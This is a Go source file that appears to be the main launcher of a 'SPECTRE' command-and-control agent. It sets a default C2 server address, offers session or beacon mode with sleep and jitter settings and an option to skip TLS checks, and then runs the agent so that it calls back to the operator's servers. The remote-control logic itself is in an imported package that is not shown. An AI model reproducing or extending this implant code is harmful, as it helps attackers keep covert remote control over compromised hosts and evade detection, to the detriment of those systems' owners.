package main

import (
	"context"
	"flag"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/sbu/spectre-c2/pkg/agent"
)

var (
	flagID       = flag.String("id", "", "Agent UUID (defaults to hostname)")
	flagServers  = flag.String("servers", "100.64.0.10:7443", "Comma-separated server addresses")
	flagTags     = flag.String("tags", "", "Comma-separated agent tags")
	flagMode     = flag.String("mode", "session", "Agent mode: session|beacon")
	flagSleep    = flag.Int64("sleep", 60, "Beacon sleep seconds")
	flagJitter   = flag.Float64("jitter", 0.1, "Beacon jitter 0.0-1.0")
	flagInsecure = flag.Bool("insecure", false, "Skip TLS verification (development only)")
)

func main() {
	flag.Parse()

	agentID := *flagID
	if agentID == "" {
		hostname, _ := os.Hostname()
		agentID = hostname
	}

	cfg := agent.Config{
		AgentID:     agentID,
		ServerAddrs: strings.Split(*flagServers, ","),
		Tags:        splitNonEmpty(*flagTags),
		Mode:        *flagMode,
		SleepSec:    *flagSleep,
		JitterPct:   *flagJitter,
		Insecure:    *flagInsecure,
	}

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	log.Printf("[*] SPECTRE agent %s starting [mode=%s] → %v", cfg.AgentID, cfg.Mode, cfg.ServerAddrs)
	agent.New(cfg).Run(ctx)
	log.Println("[*] Agent stopped.")
}

func splitNonEmpty(s string) []string {
	if s == "" {
		return nil
	}
	return strings.Split(s, ",")
}
